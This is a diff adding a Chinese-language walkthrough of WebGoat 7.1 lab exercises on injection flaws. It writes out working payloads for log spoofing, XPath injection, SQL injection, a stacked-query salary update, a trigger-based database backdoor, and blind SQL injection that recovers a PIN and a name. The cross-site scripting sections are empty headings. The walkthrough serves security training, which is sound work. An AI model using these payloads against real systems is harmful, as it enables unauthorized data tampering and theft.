@@ -117,6 +117,204 @@ sudo docker run -p 8080:8080 -t webgoat/webgoat-7.1
 
 # 2 Injection and XSS
 
+## 2.1 Injection Flaws
+
+### 2.1.1 Command Injection
+
+
+
+### 2.1.2 Numeric SQL Injection
+
+
+
+### 2.1.3 Log Spoofing
+
+![image-20210529165100845](picture/image-20210529165100845.png)
+
+可以利用换行，在日志中造成登陆成功的假象。在用户名一栏输入如下字符串：
+
+```
+Alice%0d%0aLogin Succeeded for username: admin
+```
+
+结果如下：
+
+![image-20210529165305931](picture/image-20210529165305931.png)
+
+### 2.1.4 XPATH Injection
+
+![image-20210529165419122](picture/image-20210529165419122.png)
+
+输入自己账户名和密码测试一下，结果如下：
+
+![image-20210529165715453](picture/image-20210529165715453.png)
+
+在用户名一栏输入如下字符串，密码任意输入：
+
+```
+Mike' or 1 or '1
+```
+
+结果如下：
+
+![image-20210529165927770](picture/image-20210529165927770.png)
+
+### 2.1.5 String SQL Injection
+
+![image-20210529170024754](picture/image-20210529170024754.png)
+
+可输入以下字符串：
+
+```
+Smith' or 1=1--
+```
+
+结果如下：
+
+![image-20210529170644763](picture/image-20210529170644763.png)
+
+### 2.1.6 Database Backdoors
+
+![image-20210529171647979](picture/image-20210529171647979.png)
+
+可输入以下字符串：
+
+```
+101; update employee set salary=100000000 where userid=101--
+```
+
+结果如下：
+
+![image-20210529171744141](picture/image-20210529171744141.png)
+
+可输入以下字符串：
+
+```
+101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid
+```
+
+结果如下：
+
+![image-20210529171922714](picture/image-20210529171922714.png)
+
+### 2.1.7 Blind Numeric SQL Injection
+
+![image-20210529172254093](picture/image-20210529172254093.png)
+
+可采用二分法确定 `pin` 的取值。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin<5000
+```
+
+结果合法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin<2500
+```
+
+结果合法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin<1300
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin>2000
+```
+
+结果合法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin>2300
+```
+
+结果合法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin>2400
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin<2350
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin>2375
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin<2363
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin>2367
+```
+
+结果非法。
+
+```
+101;select pin from pins where cc_number =1111222233334444 and pin=2364
+```
+
+结果合法，确定 `pin` 的取值为2364。
+
+### 2.1.8 Blind String SQL Injection
+
+![image-20210529172907773](picture/image-20210529172907773.png)
+
+首先确定`name`存储的字符串的长度，经试验长度为4，所输入的字符串如下：
+
+```
+101;select name from pins where cc_number=4321432143214321 and length(name)=4
+```
+
+枚举可能的表示名字的字符串，最终确定`name`存储的字符串为`Jill`。
+
+```
+101;select name from pins where cc_number=4321432143214321 and substr(name,1,4)='Jill'
+```
+
+![image-20210529192514410](picture/image-20210529192514410.png)
+
+## 2.2 Cross-Site Scripting
+
+### 2.2.1 Phishing with XSS
+
+
+
+### 2.2.2 Stored XSS Attacks
+
+
+
+### 2.2.3 Reflected XSS Attacks
+
+
+
+### 2.2.4 Cross Site Request Forgery (CSRF)
+
+
+
+### 2.2.5 CSRF Prompt By-Pass
+
+
+
+### 2.2.6 CSRF Token By-Pass
+
+
+
+### 2.2.7 HTTPOnly Test
+
 
 
 ---
